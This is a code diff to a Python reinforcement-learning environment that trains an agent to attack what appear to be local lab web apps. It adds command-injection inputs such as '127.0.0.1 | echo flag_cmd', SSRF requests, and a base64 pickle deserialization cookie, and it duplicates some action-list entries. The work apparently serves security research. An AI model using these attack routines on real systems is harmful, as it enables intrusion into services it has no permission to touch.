@@ -472,10 +472,19 @@ class WebSecurityGym(gym.Env):
                 # Execute action
                 # print(f"DEBUG: Executing Action {action_id}: {action_name}")
                 try:
+                    # Reset step reward buffer
+                    self.current_step_reward = 0.0
+                    
                     res = action_function()
                     if res is None:
-                        print(f"❌ ERROR: Action {action_name} returned None (Expected tuple)!")
-                        response, action_reward = None, 0.0
+                        # FIX: Handle legacy/broken actions that return None but set state/reward
+                        # If a reward was calculated internally, use it.
+                        if self.current_step_reward != 0.0:
+                            # print(f"⚠️ DEBUG: Action {action_name} returned None, using buffered reward: {self.current_step_reward}")
+                            response, action_reward = None, self.current_step_reward
+                        else:
+                            # print(f"❌ ERROR: Action {action_name} returned None (Expected tuple)!")
+                            response, action_reward = None, 0.0
                     else:
                         response, action_reward = res
                 except Exception as e:
@@ -1602,9 +1611,80 @@ class WebSecurityGym(gym.Env):
         return r, self._calculate_reward(r, "XXE")
     
     def attack_command_injection(self) -> Tuple[requests.Response, float]:
-        """Command Injection."""
-        r = self.session.post(f"{self.target_url}/ping", json={"host": "localhost; whoami"}, timeout=3)
+        """Command Injection (Updated for FileShare)."""
+        # Get payload (targeted or fuzz)
+        payload = "127.0.0.1 | echo flag_cmd" 
+        if hasattr(self.payload_manager, 'fuzz_payloads'):
+             # Try to find a command injection payload from fuzz list
+             cmd_payloads = [p for p in self.payload_manager.fuzz_payloads if '|' in p or ';' in p or '`' in p]
+             if cmd_payloads:
+                 payload = np.random.choice(cmd_payloads)
+
+        # FileShare App Target
+        if '5006' in self.target_url or 'fileshare' in self.target_url.lower():
+             r = self.session.post(f"{self.target_url}/check_status", data={"host": payload}, timeout=3)
+             return r, self._calculate_reward(r, "COMMAND_INJECTION")
+
+        # General Target
+        url = self._find_best_url(['ping', 'status', 'check', 'diagnostic'], '/ping')
+        r = self.session.post(url, json={"host": payload}, timeout=3)
         return r, self._calculate_reward(r, "COMMAND_INJECTION")
+
+    def attack_server_side_request_forgery(self) -> Tuple[requests.Response, float]:
+        """SSRF Attack (Updated for Blog Import)."""
+        payload = self.payload_manager.get_ssrf()
+        
+        # Blog App Target
+        if '5005' in self.target_url or 'blog' in self.target_url.lower():
+             # Requires Login usually, but we try anyway or rely on session
+             r = self.session.post(f"{self.target_url}/import_post", data={"url": payload}, timeout=3)
+             return r, self._calculate_reward(r, "SSRF_Internal" if "127.0.0.1" in payload else "SSRF")
+
+        # General Target
+        url = self._find_best_url(['fetch', 'import', 'proxy', 'load'], '/fetch_url')
+        r = self.session.post(url, json={"url": payload}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF")
+
+    def attack_deserialization_advanced(self) -> Tuple[requests.Response, float]:
+        """Insecure Deserialization (Updated for E-Commerce)."""
+        payload = self.payload_manager.get_deserialization()
+        
+        # E-Commerce App Target
+        if '5002' in self.target_url or 'commerce' in self.target_url.lower():
+             # Set cookie 'prefs'
+             # Payload needs to be base64 if it's bytes? 
+             # payload_manager payload is string or bytes? 
+             # The CTF payload in payload_manager is a string (latin1 decoded).
+             # We should ensure it is properly formatted for the cookie.
+             # E-commerce expects base64 encoded pickle.
+             import base64
+             
+             # If payload looks like the CTF one (starts with \x80 but as string?), just use it
+             # If it's a standard one, maybe we need to encode it?
+             # For safety, let's assume payload is the RAW pickle string (like "cos\nsystem...") 
+             # and we need to base64 encode it for the cookie.
+             # BUT the CTF payload I added was: b'...'.decode('latin1').
+             # So it is the raw bytes as string.
+             
+             try:
+                 # Encode to base64 for cookie
+                 if isinstance(payload, str):
+                     payload_bytes = payload.encode('latin1') # Convert back to bytes
+                 else:
+                     payload_bytes = payload
+                 
+                 b64_payload = base64.b64encode(payload_bytes).decode('utf-8')
+                 cookies = {'prefs': b64_payload}
+                 r = self.session.get(f"{self.target_url}/preferences", cookies=cookies, timeout=3)
+                 return r, self._calculate_reward(r, "DESERIALIZATION")
+             except:
+                 pass
+
+        # General Target
+        url = self._find_best_url(['deserialize', 'object', 'prefs'], '/deserialize')
+        r = self.session.post(url, json={"data": payload}, timeout=3)
+        return r, self._calculate_reward(r, "DESERIALIZATION")
+
     
     # SSRF & CSRF
     def attack_ssrf_internal(self) -> Tuple[requests.Response, float]:
@@ -2270,7 +2350,8 @@ class WebSecurityGym(gym.Env):
             'attack_csrf_cors_exploitation', 'attack_csrf_form_bypass', 'attack_csrf_friend_request',
             'attack_csrf_header_bypass', 'attack_csrf_json_bypass', 'attack_csrf_money_transfer',
             'attack_csrf_post_creation', 'attack_csrf_profile_update', 'attack_csrf_token_prediction',
-            'attack_ct_policy_bypass', 'attack_deserialization_advanced', 'attack_dns_rebinding',
+            'attack_ct_policy_bypass', 'attack_dns_rebinding',
+            'attack_feature_policy_bypass', 'attack_file_upload_malware', 'attack_file_upload_webshell',
             'attack_feature_policy_bypass', 'attack_file_upload_malware', 'attack_file_upload_webshell',
             'attack_frame_busting_bypass', 'attack_hpkp_bypass', 'attack_hsts_bypass',
             'attack_idor_account_balance', 'attack_idor_cart_manipulate', 'attack_idor_file_delete',
@@ -2283,7 +2364,8 @@ class WebSecurityGym(gym.Env):
             'attack_oauth_redirect_uri_bypass', 'attack_oauth_state_manipulation', 'attack_password_reset_bypass',
             'attack_path_traversal_encoded', 'attack_path_traversal_null', 'attack_race_condition_balance',
             'attack_race_condition_cart', 'attack_race_condition_coupon', 'attack_role_escalation',
-            'attack_server_side_request_forgery', 'attack_sqli_blind_boolean', 'attack_sqli_union_select',
+            'attack_sqli_blind_boolean', 'attack_sqli_union_select',
+            'attack_ssti_template', 'attack_subresource_integrity_bypass', 'attack_token_replay',
             'attack_ssti_template', 'attack_subresource_integrity_bypass', 'attack_token_replay',
             'attack_token_reuse', 'attack_waf_base64_encoding', 'attack_waf_case_variation',
             'attack_waf_comment_injection', 'attack_waf_cookie_manipulation', 'attack_waf_fragmentation',
@@ -2303,20 +2385,21 @@ class WebSecurityGym(gym.Env):
 
     def _generic_attack_placeholder(self, name):
         """Placeholder for advanced attacks not yet fully implemented."""
-        # Check if we have specific implementations for new SSO attacks
-        if name == 'attack_oauth_token_theft':
-            return self._attack_oauth_token_theft()
-        if name == 'attack_jwt_none_alg':
-            return self._attack_jwt_none_alg()
-        if name == 'attack_saml_xml_bypass':
-            return self._attack_saml_xml_bypass()
-            
-        # Return a neutral response and 0 reward for others
         try:
+            # Check if we have specific implementations for new SSO attacks
+            if name == 'attack_oauth_token_theft':
+                return self._attack_oauth_token_theft()
+            if name == 'attack_jwt_none_alg':
+                return self._attack_jwt_none_alg()
+            if name == 'attack_saml_xml_bypass':
+                return self._attack_saml_xml_bypass()
+            
+            # Return a neutral response and 0 reward for others
             # Just touch home page to keep session alive
             r = self.session.get(self.target_url, timeout=1)
             return r, 0.0
-        except:
+        except Exception as e:
+            # print(f"DEBUG: Placeholder error for {name}: {e}")
             return None, 0.0
 
     def _attack_oauth_token_theft(self):
@@ -2394,8 +2477,12 @@ class WebSecurityGym(gym.Env):
         
     def _update_state_from_response(self, response, context=None):
         """Update state metrics from a response."""
+        reward = 0.0
         if hasattr(self, '_analyze_response_content'):
-            self._analyze_response_content(response)
+            reward = self._analyze_response_content(response)
+            
+        # Store reward for actions that forget to return it
+        self.current_step_reward = reward
         
         # Update variance and timing
         self.last_response_time = response.elapsed.total_seconds()
